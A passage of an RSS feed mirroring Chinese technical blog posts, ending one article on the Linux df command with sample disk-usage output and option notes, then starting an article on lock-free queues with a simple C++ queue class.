&lt;span class=&quot;crayon-i&quot;&gt;tmpfs&lt;/span&gt;                   &lt;span class=&quot;crayon-cn&quot;&gt;17G&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;17G&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;shm&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-32&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-33&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;CT1190&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# df -lh&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-34&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-35&quot;&gt;文件系统              容量  已用 可用 已用&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; 挂载点&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-36&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-37&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda7&lt;/span&gt;              &lt;span class=&quot;crayon-cn&quot;&gt;19G&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;871M&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;18G&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-38&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-39&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda9&lt;/span&gt;             &lt;span class=&quot;crayon-cn&quot;&gt;195G&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;89G&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;96G&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;opt&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-40&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-41&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda8&lt;/span&gt;             &lt;span class=&quot;crayon-cn&quot;&gt;4.8G&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;557M&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;4.0G&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-42&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-43&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda6&lt;/span&gt;              &lt;span class=&quot;crayon-cn&quot;&gt;19G&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;1.9G&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;17G&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;usr&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-44&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-45&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda3&lt;/span&gt;             &lt;span class=&quot;crayon-cn&quot;&gt;965M&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;24M&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;892M&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;boot&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-46&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-47&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;tmpfs&lt;/span&gt;                  &lt;span class=&quot;crayon-cn&quot;&gt;16G&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;16G&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;shm&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-48&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-49&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;CT1190&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# df -k&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-50&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-51&quot;&gt;文件系统               &lt;span class=&quot;crayon-cn&quot;&gt;1K&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;块        已用     可用 已用&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; 挂载点&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-52&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-53&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda7&lt;/span&gt;             &lt;span class=&quot;crayon-cn&quot;&gt;19840892&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;890896&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;17925856&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-54&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-55&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda9&lt;/span&gt;            &lt;span class=&quot;crayon-cn&quot;&gt;203727156&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;93292572&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;99918840&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;opt&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-56&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-57&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda8&lt;/span&gt;              &lt;span class=&quot;crayon-cn&quot;&gt;4956284&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;570188&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;4130264&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-58&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-59&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda6&lt;/span&gt;             &lt;span class=&quot;crayon-cn&quot;&gt;19840892&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;1977568&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;16839184&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;usr&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-60&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-61&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sda3&lt;/span&gt;               &lt;span class=&quot;crayon-cn&quot;&gt;988116&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;23880&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;913232&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;boot&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970933879882755-62&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970933879882755-63&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;tmpfs&lt;/span&gt;                 &lt;span class=&quot;crayon-cn&quot;&gt;16473212&lt;/span&gt;         &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;16473212&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;shm&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0110 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;-h更具目前磁盘空间和使用情况 以更易读的方式显示&lt;/p&gt;
&lt;p&gt;-H根上面的-h参数相同,不过在根式化的时候,采用1000而不是1024进行容量转换&lt;/p&gt;
&lt;p&gt;-k以单位显示磁盘的使用情况&lt;/p&gt;
&lt;p&gt;-l显示本地的分区的磁盘空间使用率,如果服务器nfs了远程服务器的磁盘,那么在df上加上-l后系统显示的是过滤nsf驱动器后的结果&lt;/p&gt;
&lt;p&gt;-i显示inode的使用情况。linux采用了类似指针的方式管理磁盘空间影射.这也是一个比较关键应用&lt;/p&gt;
&lt;h3&gt;本系列文章：&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.jobbole.com/108531/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（1）：ls命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108805/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（2）：cd命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108855/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（3）：pwd命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108871/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（4）：mkdir命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108901/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（5）：rm 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108925/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（6）：rmdir 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108983/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（7）：mv命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108988/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（8）：cp 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108989/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（9）：touch 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108990/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（10）：cat 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108991/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（11）：nl 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108992/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（12）：more 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108993/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（13）：less 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108994/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（14）：head 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108995/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（15）：tail 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109262/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（16）：which命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108993/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（17）：whereis 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108994/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（18）：locate 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109265/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（19）：find 命令概览&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108996/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（20）：find命令之exec&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108997/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（21）：find命令之xargs&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109268/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（22）：find 命令的参数详解&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109506/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（23）：Linux 目录结构&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109254/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（24）：Linux 文件类型与扩展名&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/105269&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（25）：Linux 文件属性详解&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109539&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（26）：用 SecureCRT 来上传和下载文件&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109614&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（27）：linux chmod 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109674/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（28）：tar 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109696/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（29）: chgrp 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109750/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（30）: chown 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109781/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（31）: /etc/group 文件详解&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109797/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（32）：gzip 命令&lt;/a&gt;&lt;/p&gt;

        
        
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109827&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109827votetotal&quot;&gt;1&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109827&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt;  收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt;  评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;


&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Thu, 12 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-12-109827-5db63d671.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-12-109827-5db63d671.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>无锁数据结构：队列</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p&gt;队列多种多样，不同之处在于消息生产者、消费的数量不同；在于是基于预先分配的buffer有界队列，还是基于List的无界队列；在于是否支持优先级；在于是无锁非阻塞，还是有锁；在于严格遵守FIFO，公平还是非公平等等。更多细节参见&lt;a href=&quot;http://www.1024cores.net/home/lock-free-algorithms/queues&quot;&gt;Dmitry Vyukov的文章&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;众所周知，更多特定的队列需求，势必需要更加有效的算法。本文中，只考虑队列最常见的版本，多个生产者对多个消费者，无界并发队列，因此不考虑优先级。&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-medium wp-image-55310&quot; src=&quot;/images/jobbole.com/62af57f249e7916927ee98d5837624f2.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;我猜队列想必是研究人员最喜欢的数据结构，因为它简单，但却比栈复杂，因为它有两端而非一端。正是因为有两端，那么一个有趣的问题就出来了：如何在多线程环境下管理它们呢？各种版本的队列算法纷纷发表，想要做一个全面的描述是不可能的了。我提炼其中一些最流行的算法简要介绍一下，首先从经典队列开始。&lt;/p&gt;
&lt;h2&gt;经典队列&lt;/h2&gt;
&lt;p&gt;经典队列是一个带有两端，即头和尾的列表。从头部读取数据，从尾部写入数据。&lt;/p&gt;
&lt;h2&gt;一个标准的简单队列&lt;/h2&gt;
&lt;p&gt;下面的代码拷贝自&lt;a href=&quot;http://blog.jobbole.com/90810/&quot;&gt;《无锁数据结构：简介》&lt;/a&gt;&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9f471b0ce677475022&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;C++&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
struct Node {
        Node * m_pNext ;
};
class queue {
        Node * m_pHead ;
        Node * m_pTail ;
public:
        queue(): m_pHead( NULL ), m_pTail( NULL ) {}
    void enqueue( Node * p )
    {
        p-&amp;gt;m_pNext = nullptr;
        if ( m_pTail )
           m_pTail-&amp;gt;m_pNext = p;
        else
            m_pHead = p ;
        m_pTail = p ;
    }
    Node * dequeue()
    {
        if ( !m_pHead ) return nullptr ;
        Node * p = m_pHead ;
        m_pHead = p-&amp;gt;m_pNext ;
        if ( !m_pHead )
            m_pTail = nullptr ;
        return p ;
    }
};&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-3&quot;&gt;3&lt;/div&gt;
